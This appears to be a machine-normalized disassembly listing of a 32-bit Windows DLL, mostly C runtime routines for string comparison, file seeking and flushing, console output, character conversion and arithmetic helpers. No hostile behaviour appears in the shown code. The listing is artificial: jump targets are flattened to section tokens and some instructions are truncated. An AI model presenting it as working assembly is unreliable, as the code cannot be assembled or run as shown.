call sub_1000ecdb
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_1000d8e6
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_1000ed69
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_10016b72
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001732f
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_1001732f
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_1000e6e5
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_1001735d
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10017291
add esp 0x18
pop ebp
retn
sub_1001737d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_1000d1a7
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d320
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_100175c2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019056
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_1000ecdb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10017748
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10017768
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_1000c0a5
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_100177ad
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100177ad
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10017768
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1001785d
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1001787c
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10017854
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1001785d
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1001787f
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_10015a7d
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_100178c8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_1000e5ce
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1000ed01
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_1001794d
push 0x14
push r--data
call sub_1000ed24
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1000ecee
and [ eax ] 0x0
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] edi
call sub_1000ecdb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1000ed69
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_1000e645
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000ecee
mov [ eax ] edi
call sub_1000ecdb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100178c8
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017a5c
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_10017a66
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_10017abd
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_10017abd
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_10017a66
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_10017b4c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_1000d8e6
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_10017bb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1001af06
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000c0a5
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_10017c75
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_10017da6
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1000ecdb
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10017da6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10017e00
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_10017e2b
push 0x10
push r--data
call sub_1000ed24
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecdb
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000d8e6
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1000ed69
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000e645
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_1000e5ce
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017f02
mov eax [ ebp - 0x1c ]
call sub_1000ecee
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_10017f0c
push 0x10
push r--data
call sub_1000ed24
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1001211a
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_1000ed69
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10017fa6
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_10017faf
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_10013be0
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_10017fd0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1000ecdb
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000d8e6
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x2a
call sub_1000ecdb
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1000ecdb
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000d8e6
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_1000fe10
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_1000fe10
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10018160
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_10018241
push 0x8
push r--data
call sub_1000ed24
push [ rw-data ]
call sub_10013c5b
pop ecx
test eax eax
je r-xdata
call sub_100181f5
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_100182a8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_100182ec
push 0x20
push r--data
call sub_1000ed24
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_10013e6b
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_1000ed69
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_100182a8
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
